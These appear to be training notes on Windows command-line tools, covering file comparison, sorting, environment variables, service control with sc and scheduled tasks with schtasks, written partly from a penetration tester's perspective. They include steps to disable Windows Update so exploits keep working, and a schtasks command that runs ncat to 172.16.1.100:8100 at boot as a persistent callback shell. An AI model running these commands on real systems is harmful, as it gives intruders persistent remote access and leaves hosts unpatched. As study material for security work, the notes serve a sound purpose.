PS C:\Users\MTanaka\Desktop> echo b > .\file-2.md
PS C:\Users\MTanaka\Desktop> comp .\file-1.md .\file-2.md /A
Comparing .\file-1.md and .\file-2.md...
Compare error at OFFSET 2
file1 = a
file2 = b  
```

We used echo to ensure the strings differed and then reran the comparison. Notice how our output changed, and using the /A modifier, we are seeing the character difference between the two files now. `Comp` is a simple but effective tool. Now let us look at `FC` for a minute. `FC` differs in that it will show you which lines are different, not just an individual character (`/A`) or byte that is different on each line. FC has quite a few more options than Comp has, so be sure to look at the help output to ensure you are using it in the manner you want

`FC` Help
When FC performs its inspection, it is case-sensitive and cares more than just a byte-for-byte comparison. Below we will use a few files with many more characters and strings to test its functionality. We will perform a basic check and have it print the line numbers and the ASCII comparison using the `/N` modifier.

### Sort 
```cmd-session
C:\Users\student\Desktop> type .\file-1.md
a
b
d
h
w
a
q
h
g

C:\Users\MTanaka\Desktop> sort.exe .\file-1.md /O .\sort-1.md
C:\Users\MTanaka\Desktop> type .\sort-1.md

a
a
b
d
g
h
h
q
w
```

Above, we can see using `sort` on the file `file-1.md` and then sending the result with the `/O` modifier to the file sort-1.md, we took our list of letters, sorted them in alphabetical order, and wrote them to the new file. It can get more complex when working with larger datasets, but the basic usage is still the same. If we wanted `sort` only to return unique entries, we could also use the /unique modifier. Notice the first two entries in the `sort-1.md` file . Let us try using unique and see what happens.

### unique


```cmd-session
C:\htb> type .\sort-1.md

a
a
b
d
g
h
h
q
w

PS C:\Users\MTanaka\Desktop> sort.exe .\sort-1.md /unique

a
b
d
g
h
q
w  
```

Notice how we have fewer overall results now. This is because `sort` did not write duplicate entries from the file to the console.

---

Finding files and directories, sorting datasets, and comparing files are all essential skills we should have in our arsenal. Next, we will discuss Environment variables and what they provide us as a cmd-prompt user.

---
# ENV Variables

Environment Variables are settings often applied globally to out hosts. They can be found on Windows,Linux,MacOS hosts. This concept is not specific to one OS type, but function differently on each OS.

ENV variables can be accessed by most users and applications on host and are used to run scripts and speed up how applications function and reference data. On a windows host, env variables are not case sensitive can have spaces and numbers in name.The only catch is they can't start with numbers or include an equal sign.

It is normal to see these variables (especially those already built into the system) displayed in uppercase letters and utilizing an underscore to link any words in the name. Before moving on, we should mention one crucial concept regarding environment variables known as `Scope`.

### Variable Scope

In context, `Scope` is programming concept that refers to where variables can be accessed or referenced. `Scope` can be broadly separated into two categories:

- **Global:**
    - Global variables are accessible `globally`. In this context, the global scope lets us know that we can access and reference the data stored inside the variable from anywhere within a program.
- **Local:**
    - Local variables are only accessible within a `local` context. `Local` means that the data stored within these variables can only be accessed and referenced within the function or context in which it has been declared.

Windows has its own set of variables known as Environment Variables. These variables can be separated into their defined scopes known as System and User scopes.

There is another defined scope known as `Process` scope and it is volatile by nature and is considered sub-scope of both the `System` and `User` scopes.

| Scope              | Description                                                                                                                                                                                                                                                                                                                                                                                       | Permissions Required to Access                                    | Registry Location                                                                 |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `System (Machine)` | The System scope contains environment variables defined by the Operating System (OS) and are accessible globally by all users and accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime.                                                                                                                                           | Local Administrator or Domain Administrator                       | `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` |
| `User`             | The User scope contains environment variables defined by the currently active user and are only accessible to them, not other users who can log on to the same system.                                                                                                                                                                                                                            | Current Active User, Local Administrator, or Domain Administrator | `HKEY_CURRENT_USER\Environment`                                                   |
| `Process`          | The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process). | Current Child Process, Parent Process, or Current Active User     | `None (Stored in Process Memory)`                                                 |

## Using Set and Echo to View Variables

We have couple of choices to view variables they are `set` and `echo`.

#### Display with Set

```cmd-session
C:\Users\htb\Desktop>set %SYSTEMROOT%

Environment variable C:\Windows not defined
```

Upon opening the command prompt, you can issue the command `set` to print all available environment variables on the system. Alternatively, you can enter the same command again with the variable's name without setting it equal to anything to print the value of a specific variable. We see that in this case, it mentions the value itself is not defined; however, this is because we are not defining the value of `%SYSTEMROOT%` using `set` in this example.

#### Display with Echo

```cmd-session
C:\Users\htb\>echo %PATH%

C:\Users\htb\Desktop
```

Similar to the example above, you can use `echo` to display the value of an environment variable. Unlike the previous command, `echo` is used to print the value contained within the variable and has no additional built-in features to edit environment variables. In the next section, we will discuss how we create new variables, remove unneeded ones, and edit existing ones using the command prompt.

### Manage ENV Variables

We have two methods for managing ENV to perform operations such as create, remove and manage them from our prompt, they are `set` or `setx` to perform our intended actions.

##### When to use set and setx?

Both are cli utilities that allow operations such as display,set and remove env variables.The difference lies in how they achieve these goals. The `set` utility only manipulate env variables in current cli session. this means once we terminate the current session , any additions , removals or changes will not be reflected the next time we open command prompt. Suppose we are to make permanent changes to env variables we use `setx` to make the appropriate changes to registry which exist even after restart of current session.

>**Note:** Using `setx`, we also have some additional functionality added in, such as being able to create and tweak variables across computers in the domain as well as our local machine.

#### Using set
```cmd-session
C:\htb> set DCIP=172.16.5.2
```

The command doesn't show immediate output running it.We need to use `echo` to see the changes.

#### Validating the Change

```cmd-session
C:\htb> echo %DCIP%

172.16.5.2
```

The environment variable `%DCIP%` is now set and available for us to access. As stated above, this change is considered part of the `process` scope, as whenever we exit the command prompt and start a new session, this variable will cease to exist on the system. We can remedy this situation by permanently setting this variable in the environment using `setx`.

#### Using setx

```cmd-session
C:\htb> setx DCIP 172.16.5.2

SUCCESS: Specified value was saved.
```

In the previous example, we set `172.16.5.2` as the value for the DC on the network; however, using `setx`, we can update this value by simply setting the value again to our new address, `172.16.5.5`.

#### Validating the edit

```cmd-session
C:\htb> echo %DCIP%

172.16.5.5
```

We have successfully edited our initial custom variable to reflect the DC's IP change. We can now move on and discuss removing variables.

#### Removing Variables

Much like creating and editing variables we can also remove environment variables in a very similar manner. To remove variables we cannot directly delete them like we would do a file or directory. Instead we need to set the value to nothing. This action will effectively delete the variable and prevent it from being used as intended due to value being removed.

#### Using setx
```cmd-session
C:\htb> setx DCIP ""


SUCCESS: Specified value was saved.
```

This command will remove `%DCIP%` from our system's current environment variables and will also be reflected in the registry once we open a new command prompt session. We can verify that this is indeed the case by doing the following:

#### Verifying the Variable has Been Removed

```cmd-session
C:\htb> set DCIP
Environment variable DCIP not defined

C:\htb> echo %DCIP%
%DCIP%
```

Using both `set` and `echo`, we can verify that the `%DCIP%` variable is no longer set and is not defined in our environment anymore.

## Important Environment Variables

Now that we are comfortable creating, editing, and removing our own environment variables, let us discuss some crucial variables we should be aware of when performing enumeration on a host's environment. Remember that all information found here is provided to us in clear text due to the nature of environment variables. As an attacker, this can provide us with a wealth of information about the current system and the user account accessing it.

|Variable Name|Description|
|---|---|
|`%PATH%`|Specifies a set of directories(locations) where executable programs are located.|
|`%OS%`|The current operating system on the user's workstation.|
|`%SYSTEMROOT%`|Expands to `C:\Windows`. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.|
|`%LOGONSERVER%`|Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.|
|`%USERPROFILE%`|Provides us with the location of the currently active user's home directory. Expands to `C:\Users\{username}`.|
|`%ProgramFiles%`|Equivalent of `C:\Program Files`. This location is where all the programs are installed on an `x64` based system.|
|`%ProgramFiles(x86)%`|Equivalent of `C:\Program Files (x86)`. This location is where all 32-bit programs running under `WOW64` are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (`x86` vs. `x64` architecture)|

Provided here is only a tiny fraction of the information we can learn through enumerating the environment variables on a system. However, the abovementioned ones will often appear when performing enumeration on an engagement. For a complete list, we can visit the following [link](https://ss64.com/nt/syntax-variables.html). Using this information as a guide, we can start gathering any required information from these variables to help us learn about our host and its target environment inside and out.

---

# Managing Services

Monitoring and controlling services on a host is integral to being an administrator. As an attacker, the ability to interrogate services, find solid points to hook into, and turn services on or off is a sought-after ability when landing on a host. In this section, we will look at the usage of `sc`, the Windows command line service controller utility, but we will go about it a little differently. Let's look at this from the perspective of an attacker. We have just landed on a victims host and need to:

- Determine what services are running.
- Attempt to disable antivirus.
- Modify existing services on a system.
  

### Service Controller

[SC](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599\(v=ws.11\)) is a windows executable utility that allow us to query, modify and manage host services locally over network. We have other tools like Windows Management Instrumentation(`WMIC`) AND `Tasklist` that can also query and manage service for local and remote host.

#### Query Services

Being able to `query` services for information such as `process state`, `process id` (`pid`), and `service type` is a valuable tool to have in our arsenal as an attacker. We can use this info to check the running services or all existing services and drivers on system for further info.
We can check for services using `sc`

> **Note:** The spacing for the optional query parameters is crucial. For example, `type= service`, `type=service`, and `type =service` are completely different ways of spacing this parameter. However, only `type= service` is correct in this case.

```cmd-session
C:\htb> sc query type= service

SERVICE_NAME: Appinfo
DISPLAY_NAME: Application Information
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AppXSvc
DISPLAY_NAME: AppX Deployment Service (AppXSVC)
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: AudioEndpointBuilder
DISPLAY_NAME: Windows Audio Endpoint Builder
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
<SNIP>
```

We can see a complete list of the actively running services on this system. Using this information, we can thoroughly scope out what is running on the system and look for anything that we wish to disable or in some cases, services that we can attempt to take over for our own purposes, whether it be for escalation or persistence.

Returning to our scenario, we recently landed on a host and need to `query` the host and determine if Windows Defender is active. Let's give `sc query` a try.

##### Querying for Windows Defender
```cmd-session
C:\htb> sc query windefend    

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

## Stopping and Starting Services

#### Stopping a Elevated service

```cmd-session
C:\htb> sc stop windefend

Access is denied.  
```

Now that we failed to stop `windefend`  service because we might have privileges of standard user not administrator level.So, to perform the stop action we must have elevated privileges. Ideally this is not a best way to stop service as this will lead to get us caught and kicked up from running the a command like this in traffic.

Sometime certain process are protected under stricter access requirements than what a local admin accounts have. In this scenario, the only thing that can stop and start the Defender service is the [SYSTEM](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#default-local-system-accounts) machine account.

### Stopping Services

Moving on, let's find ourselves a service we can take out as an Administrator. The good news is that we can stop the Print Spooler service. Let's try to do so.



##### Finding the Print Spooler Service

```cmd-session
C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

As we can see from the output above, the `Spooler` service is actively running on our current system.

##### Stopping the Print Spooler Service

```cmd-session
C:\WINDOWS\system32> sc stop Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x4e20

C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

As stated above, we can issue the command `sc stop Spooler` to have Windows issue a `STOP` control request to the service. It is important to note that not all services will respond to these requests, regardless of our permissions, especially if other running programs and services depend on the service we are attempting to stop.

#### Starting Services

Much like stopping services, we are also able to start services as well. Although stopping services seems to offer a bit more practicality at first to the red team, being able to start services can lend itself to be especially useful in conjunction with being able to modify existing services.

Starting from our previous example, we are still working with the `Spooler` service that was stopped previously. We can restart this service by issuing the `sc start Spooler` command. Let's try it now.

#### Starting the Print Spooler Service

```cmd-session
C:\WINDOWS\system32> sc start Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 34908
        FLAGS              :

C:\WINDOWS\system32> sc query Spooler

SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

We can see here that upon issuing a start request to the `Spooler` service, we can see that it begins in a `START_PENDING` state and, after another query, is fully up and operational. Typically services will take a few seconds or so to initialize after a request to start is issued.

## Modifying Services
In addition to being able to start and stop services, we can also attempt to modify existing services as well. This is where attackers can thrive as we try to modify existing services to serve whatever purpose we need them to. In some cases, we can change them to be disabled at startup or modify the service's path to the binary itself. Be aware that these examples are only some of the possibilities of the actions we can take. With such a versatile command, we have many options for manipulating services to do whatever we need them to. Let's go ahead and see if we can modify some services to prevent Windows from updating itself.

#### Disabling Windows Updates Using SC

To configure services, we must use the [config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config) parameter in `sc`. This will allow us to modify the values of existing services, regardless if they are currently running or not. All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (`SCM`). Remember that all changes to existing services will only fully update after restarting the service.

>**Note:** It is important to be aware that modifying existing services can effectively take them out permanently as any changes made are recorded and saved in the registry, which can persist on reboot. Please exercise caution when modifying services in this manner.

let's try to take out Windows Updates for our current compromised host.

Unfortunately, the Windows Update feature (`Version 10 and above`) does not just rely on one service to perform its functionality. Windows updates rely on the following services:

|Service|Display Name|
|---|---|
|`wuauserv`|Windows Update Service|
|`bits`|Background Intelligent Transfer Service|
Let's query all of the required services and see what is currently running and needs to be stopped before making our required changes.

>_Important: The scenario below requires access to a privileged account. Making updates to services will typically require a set of higher permissions than a regular user will have access to._

#### Checking the State of the Required Services
```cmd-session
C:\WINDOWS\system32> sc query wuauserv

SERVICE_NAME: wuauserv
        TYPE               : 30  WIN32
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\WINDOWS\system32> sc query bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

From the information provided above, we can see that the `wuauserv` service is not currently active as the system is not currently in the process of updating. However, the `bits` service (required to download updates) is currently running on our system. We can issue a stop to this service using our knowledge from the prior section by doing the following:

#### Stopping BITS

```cmd-session
C:\WINDOWS\system32> sc stop bits

SERVICE_NAME: bits
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x0

```

After ensuring that both services are currently stopped, we can modify the `start type` of both services. We can issue this change by performing the following:

#### Disabling Windows Update Service
```cmd-session
C:\WINDOWS\system32> sc config wuauserv start= disabled

[SC] ChangeServiceConfig SUCCESS
```

#### Disabling Background Intelligent Transfer Service
```cmd-session
C:\WINDOWS\system32> sc config bits start= disabled

[SC] ChangeServiceConfig SUCCESS
```

#### Verifying Services are Disabled

```cmd-session
C:\WINDOWS\system32> sc start wuauserv 

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

C:\WINDOWS\system32> sc start bits

[SC] StartService FAILED 1058:

The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

```

>**Note:** To revert everything back to normal, you can set `start= auto` to make sure that the services can be restarted and function appropriately.

We have verified that both services are now disabled, as we cannot start them manually. Due to the changes made here, Windows cannot utilize its updating feature to provide any system or security updates. This can be very beneficial to an attacker to ensure that a system can remain out of date and not retrieve any updates that would inhibit the usage of certain exploits on a target system. Be aware that by doing this in this manner, we will likely be triggering alerts for this sort of action set up by the resident blue team. This method is not quiet and does require elevated permissions in a lot of cases to perform.

## Other Routes to Query Services

Till now we have only focused on using `sc` to query, start, stop, and modify services. However, we have other choices regarding how to accomplish some of these same tasks using different commands. In this section, we will strictly focus on using some of these other commands to help with our enumeration by being able to query services and display the available information in different ways.

#### Using Tasklist

[Tasklist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist) is a cli based tool that gives list of currently running process on a local or remote host. We can use a `/svc` parameter such that it provides a list of services running under each process on the system.

```cmd-session
C:\htb> tasklist /svc


Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                       108 N/A
smss.exe                       412 N/A
csrss.exe                      612 N/A
wininit.exe                    684 N/A
csrss.exe                      708 N/A
services.exe                   768 N/A
lsass.exe                      796 KeyIso, SamSs, VaultSvc
winlogon.exe                   856 N/A
svchost.exe                    984 BrokerInfrastructure, DcomLaunch, PlugPlay,
                                   Power, SystemEventsBroker
fontdrvhost.exe               1012 N/A
fontdrvhost.exe               1020 N/A
svchost.exe                    616 RpcEptMapper, RpcSs
svchost.exe                    996 LSM
dwm.exe                       1068 N/A
svchost.exe                   1236 CoreMessagingRegistrar
svchost.exe                   1244 lmhosts
svchost.exe                   1324 NcbService
svchost.exe                   1332 TimeBrokerSvc
svchost.exe                   1352 Schedule
<SNIP>
```

As we can see, we have a full listing of processes that are currently running on the system, their respective `PID`, and what service(s) are hosted under each process. This can be very helpful in quickly locating what process hosts what service(s).

### Using Net Start

[Net start](https://ss64.com/nt/net-service.html) is a very simple command that will allow us to quickly list all of the current running services on a system. In addition to `net start` there is `net stop`, `net pause` and `net continue`. These will behave very similarly to `sc` as we can provide the name of service afterwards and be able to perform the actions specified in command against service that we provide.

```cmd-session
C:\htb> net start

These Windows services are started:

   Application Information
   AppX Deployment Service (AppXSVC)
   AVCTP service
   Background Tasks Infrastructure Service
   Base Filtering Engine
   BcastDVRUserService_3321a
   Capability Access Manager Service
   cbdhsvc_3321a
   CDPUserSvc_3321a
   Client License Service (ClipSVC)
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   Connected Devices Platform Service
   Connected User Experiences and Telemetry
   CoreMessaging
   Credential Manager
   Cryptographic Services
   Data Usage
   DCOM Server Process Launcher
   Delivery Optimization
   Device Association Service
   DHCP Client
   <SNIP>
```

From the output above, we can see that using `net start` without specifying a `service` will list all of the active services on the system.

#### Using WMIC
Last but not least, we have [WMIC](https://ss64.com/nt/wmic.html). The Windows Management Instrumentation Command (`WMIC`) allows us to retrieve a vast range of information from our local host or host(s) across the network. The versatility of this command is wide in that it allows for pulling such a wide arrangement of information.However, we will only be going over a very small subset of the functionality provided by the `SERVICE` component residing inside this application.

To list all services existing on our system and information on them, we can issue the following command: `wmic service list brief` .

![[Pasted image 20250708214648.png]]

After doing so, we can see that we have a nice list containing important information such as the `Name`, `ProcessID`, `StartMode`, `State`, and `Status` of every service on the system, regardless of whether or not it is currently running.

> **Note:** It is important to be aware that the `WMIC` command-line utility is currently deprecated as of the current Windows version. As such, it is advised against relying upon using the utility in most situations. You can find further information regarding this change by following this [link](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic).

---

# Working With Scheduled Tasks
Scheduled tasks are an excellent way for administrators to ensure that tasks they want to run regularly happen, but they are also an excellent persistence point for attackers. In this section, we will discuss using schtasks to:

- Learn how to check what tasks exist.
- Create a new task to help us automate actions or acquire a shell on the host.

#### What Are Scheduled Tasks?
The Task Scheduler allows us as admins to perform routine tasks without having to kick them off manually. The scheduler will monitor the host for a specific set of conditions called triggers and execute the task once the conditions are met.

>**Story Time: On several engagements, while pentesting an enterprise environment, I have been in a position where I landed on a host and needed a quick way to set persistence. Instead of doing anything crazy or pulling down another executable onto the host, I decided to search for or create a scheduled task that runs when a user logs in or the host reboots. In this scheduled task, I would set a trigger to open a new socket utilizing PowerShell, reaching out to my Command and Control infrastructure. This would ensure that I could get back in if I lost access to this host. If I were lucky, when the task I chose ran, I might also receive a SYSTEM-level shell back, elevating my privileges at the same time. It quickly ensured host access without setting off alarms with antivirus or data loss prevention systems.**

#### Triggers That Can Kick Off a Scheduled Task
- When a specific system event occurs.
- At a specific time.
- At a specific time on a daily schedule.
- At a specific time on a weekly schedule.
- At a specific time on a monthly schedule.
- At a specific time on a monthly day-of-week schedule.
- When the computer enters an idle state.
- When the task is registered.
- When the system is booted.
- When a user logs on.
- When a Terminal Server session changes state.
  
This list of triggers is extensive and gives us many options for having a task take action. Now that we know what scheduled tasks are and what can make them actionable, it is time to look at using them.  

### How To Utilize Schtasks
In the sections provided below, we will go over exactly how we can utilize the `schtasks` command to its fullest extent.Additionally, as we go over them in greater detail, a formatted table providing the syntax for each action will be provided.

Note that the sections provided here are not an end-all-be-all. Several of the repetitive parameters have been omitted. Be sure to check the help menu `/?` to see a complete list of what can be used.

#### Display Scheduled Tasks:
#### Query Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Query`||Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
||/fo|Sets formatting options. We can specify to show results in the `Table, List, or CSV` output.|
||/v|Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.|
||/nh|Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.|
||/s|Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".|
||/u|This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.|
||/p|Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter.|
We can view the tasks that already exist on our host by utilizing the `schtasks` command like so:
```cmd-session
C:\htb> SCHTASKS /Query /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Start In:                             N/A
Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          tru7h
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A

<SNIP>
```

Chaining our parameters with `Query` allows us to format our output from the standard bulk into a list with advanced settings. The above output shows how the tasks would look in a list format.

#### Create a New Scheduled Task:

#### Create Syntax

|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Create`||Schedules a task to run.|
||/sc|Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.|
||/tn|Sets the name for the task we are building. Each task must have a unique name.|
||/tr|Sets the trigger and task that should be run. This can be an executable, script, or batch file.|
||/s|Specify the host to run on, much like in Query.|
||/u|Specifies the local user or domain user to utilize|
||/p|Sets the Password of the user-specified.|
||/mo|Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.|
||/rl|Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. Limited is the default value.|
||/z|Will set the task to be deleted after completion of its actions.|
Creating a new scheduled task is pretty straightforward. At a minimum, we must specify the following:

- `/create` : to tell it what we are doing
- `/sc` : we must set a schedule
- `/tn` : we must set the name
- `/tr` : we must give it an action to take
  
  #### New Task Creation

```cmd-session
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

> **A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down. We can create or modify a new task by adding a new trigger and action. In our task above, we have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.**

Now let us look at what modifying a task would look like.

### Change the Properties of a Scheduled Task

#### Change Syntax
|**Action**|**Parameter**|**Description**|
|---|---|---|
|-----|-----|-----|
|`Change`||Allows for modifying existing scheduled tasks.|
||/tn|Designates the task to change|
||/tr|Modifies the program or action that the task runs.|
||/ENABLE|Change the state of the task to Enabled.|
||/DISABLE|Change the state of the task to Disabled.|

Ok, now let us say we found the `hash` of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.

```cmd-session
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```

Now to make sure our changes took, we can query for the specific task using the `/tn` parameter and see:

```cmd-session
C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 

Folder: \
HostName:                             DESKTOP-Victim
TaskName:                             \My Secret Task
Next Run Time:                        N/A
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/30/1999 12:00:00 AM
Last Result:                          267011
Author:                               DESKTOP-victim\htb-admin
Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up

<SNIP>  
```

It looks like our changes were saved successfully. Managing tasks and making changes is pretty simple. We need to ensure our syntax is correct, or it may not fire. If we want to ensure it works, we can use the `/run` parameter to kick the task off immediately. We have `queried, created, and changed` tasks up to this point. Let us look at how to delete them now.

### Delete the Scheduled Task(s)
#### Delete Syntax
|**Action**|**Parameter**|**Description**|
|---|---|---|
|`Delete`||Remove a task from the schedule|
||/tn|Identifies the task to delete.|
||/s|Specifies the name or IP address to delete the task from.|
||/u|Specifies the user to run the task as.|
||/p|Specifies the password to run the task as.|
||/f|Stops the confirmation warning.|
```cmd-session
C:\htb> schtasks /delete  /tn "My Secret Task" 

WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
```

Running `schtasks /delete` is simple enough. The thing to note is that if we do not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. Using `/F` will delete the task and suppress the message.

---

# CMD vs Powershell

Now let's see look at Window's modern successor to CMD, [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2). This section will cover what PowerShell is, the differences between PowerShell and CMD, how to get help within the CLI, and basic navigation within the CLI.

## Differences

Powershell and CMD are included natively on any Windows host

#### PowerShell and CMD Compared

|**Feature**|**CMD**|**PowerShell**|
|---|---|---|
|Language|Batch and basic CMD commands only.|PowerShell can interpret Batch, CMD, PS cmdlets, and aliases.|
|Command utilization|The output from one command cannot be passed into another directly as a structured object, due to the limitation of handling the text output.|The output from one command can be passed into another directly as a structured object resulting in more sophisticated commands.|
|Command Output|Text only.|PowerShell outputs in object formatting.|
|Parallel Execution|CMD must finish one command before running another.|PowerShell can multi-thread commands to run in parallel.|

